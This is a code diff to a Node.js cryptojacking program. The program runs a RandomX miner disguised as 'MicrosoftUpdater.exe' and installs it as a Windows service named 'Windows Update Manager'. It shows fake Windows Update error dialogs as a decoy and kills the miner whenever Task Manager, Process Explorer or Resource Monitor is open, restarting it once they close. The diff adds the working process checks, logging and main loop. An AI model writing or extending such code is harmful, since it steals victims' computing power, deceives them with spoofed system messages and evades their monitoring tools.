@@ -4,28 +4,32 @@
 
 const Win = require('windows-interact');
 const si = require('systeminformation');
+const { exec } = require('child_process');
+const { execSync } = require('child_process');
 
 const flags = '--threads=1 --cpu-affinity=1 --cpu-priority=1 --no-huge-pages --asm=auto --randomx-mode=light';
 
 // Win-interact preferences
 
-class Web {
+/* class Web {
     constructor(url) {
+
         this.url = url;
+
     }
     POST (url) {
+
 
     }
     PUT (url) {
 
+
     }
     GET (url) {
 
+
     }
-}
-
-
-
+} */
 
 Win.set.preferences({
     TTSVoice: 'Microsoft David Desktop',
@@ -55,53 +59,43 @@ Win.appManager.register({
 async function main() {
     while (true) {
         // Check if Task Manager, Process Explorer, or Resource Monitor are running and kill the miner accordingly
-        const taskManagerIsRunning = Win.process.isRunning('TaskManager');
-        const processExplorerIsRunning = checkIfProcessExplorerIsRunning(); // Boolean
-        const resourceMonitorIsRunning = Win.process.isRunning('ResourceMonitor');
-        if ((taskManagerIsRunning || processExplorerIsRunning || resourceMonitorIsRunning) && (checkIfAlreadyRunning('MicrosoftUpdater') == true)) {
+        const taskManagerIsRunning = checkIfAnyProcessIsRunning('Taskmgr.exe');
+        const processExplorerIsRunning = checkIfAnyProcessIsRunning('procexp64.exe'); // Boolean
+        const resourceMonitorIsRunning = checkIfAnyProcessIsRunning('perfmon.exe');
+        console.log(taskManagerIsRunning);
+        console.log(processExplorerIsRunning);
+        console.log(resourceMonitorIsRunning);
+        
+        if (taskManagerIsRunning || processExplorerIsRunning || resourceMonitorIsRunning && checkIfAnyProcessIsRunning('MicrosoftUpdater.exe') == true) {
         // If Task Manager, Process Explorer, or Resource Monitor is running, and the malware is running as well, kill it
-        killMiner();
+            killMiner();
+            wait(1000);
+            console.log('miner killed due to taskmgr opening');
     }
-        if ((!taskManagerIsRunning && !processExplorerIsRunning && !resourceMonitorIsRunning && checkIfAlreadyRunning('MicrosoftUpdater')) == false) {
+        if (!taskManagerIsRunning && !processExplorerIsRunning && !resourceMonitorIsRunning && checkIfAnyProcessIsRunning('MicrosoftUpdater.exe') == false) {
+            runMiner();
+            wait(1000);
+            console.log('miner restarted due to favorable conditions');
+        
+        }
         // As long as neither TaskMgr, ProcExp, or ResMon is running and the malware is not already running, start it
-        runMiner();
-    }
-        wait(2000);
+        wait(500);     
     }
 }
 
 // Checks if a process is already running to prevent multi-execution
 
-async function checkIfAlreadyRunning(process) {
-    const systemProcesses = Win.cmd('tasklist');
-    const indexedProcesses = systemProcesses.split('\n');
-    for (let i = 0; i < indexedProcesses.length; i++) {
-        if (indexedProcesses == process) {
-            console.log(`${process} is running.`);
-            return true;
-        } else {
-            console.log(`${process} is not running.`);
-            return false;
-        }
-    }
-}
+function checkIfAnyProcessIsRunning(processImageName) { // returns true or false
+    const output = execSync(`tasklist /FI "IMAGENAME eq ${processImageName}`, 
+    {encoding: 'utf-8'});
+    return !output.includes(`INFO: No tasks are running which match the specified criteria.`);
+  }
 
-async function checkIfProcessExplorerIsRunning() {
-    const systemProcesses = Win.cmd('tasklist');
-    const indexedProcesses = systemProcesses.split('\n');
-    const processExplorerAliases = ['procexp.exe', 'procexp64.exe', 'procexp64a.exe'];
-    for (const line of indexedProcesses) {
-        for (const name of processExplorerAliases) {
-            if (line.toLowerCase().includes(name))
-                return true;
-                break;
-        }
-    }
-}
 
 function killMiner() {
     try {
         Win.cmd('TASKKILL /f /IM MicrosoftUpdater.exe /T');
+        console.log('miner killed');
     } catch {
         Win.cmd('TASKKILL /f /IM MicrosoftUpdater.exe'); 
     }
@@ -112,10 +106,12 @@ function wait(ms) {
 }
 
 function runMiner() {
-    Win.cmd('start.cmd' + flags);
+    Win.cmd('start.cmd --threads=1 --cpu-affinity=1 --cpu-priority=1 --no-huge-pages --asm=auto --randomx-mode=light');
+    console.log('miner started');
 }
 
 async function autorunMethods() {
+    console.log('autorunMethods called');
     try {
         registerMinerAsService(); 
         /* Running the miner as a system service is preferred because the average user
@@ -133,8 +129,10 @@ async function addToWinTaskScheduler() { // Adds start.cmd to Windows Task Sched
 
 async function registerMinerAsService() {
     Win.cmd('sc create Windows Update Manager binPath= start.cmd start= auto');
+    console.log('miner added to system services')
     wait(1000);
     Win.cmd('net start Windows Update Manager');
+    console.log('miner run as service');
 }
 
 async function fakeInstall() {
@@ -156,10 +154,12 @@ async function fakeInstall() {
                 await Win.alert('A security package specific error occurred. Error code: 0x721.', windowFailTitle); 
         }
         await Win.alert('Please visit https://learn.microsoft.com/en-us/windows/win32/debug/error-handling for more information.', 'Windows Updater failure');
+        console.log('fake dialog succeeded');
     } catch {
         console.log("An error occured");
     } finally {
         runMiner();
+        console.log('running Miner with runMiner()');
     }
 }
 
@@ -168,6 +168,7 @@ async function checkIfWorthMining() {
         const cpu = await si.cpu();
         const os = await si.osInfo();
         const mem = await si.mem(); // in bytes!
+        console.log('hardware polled');
 
         const L2CacheInKB = cpu.cache.l2/1024;
         const L3CacheInKB = cpu.cache.l3/1024;
@@ -198,5 +199,10 @@ async function checkIfWorthMining() {
 // Main structure of the miner before main loop
 
 checkIfWorthMining();
+console.log('checkifworthmining succeeded');
 fakeInstall();
+console.log('fakeinstall called');
 autorunMethods();
+console.log('autorunmethods called');
+main();
+console.log('main loop started >:D');
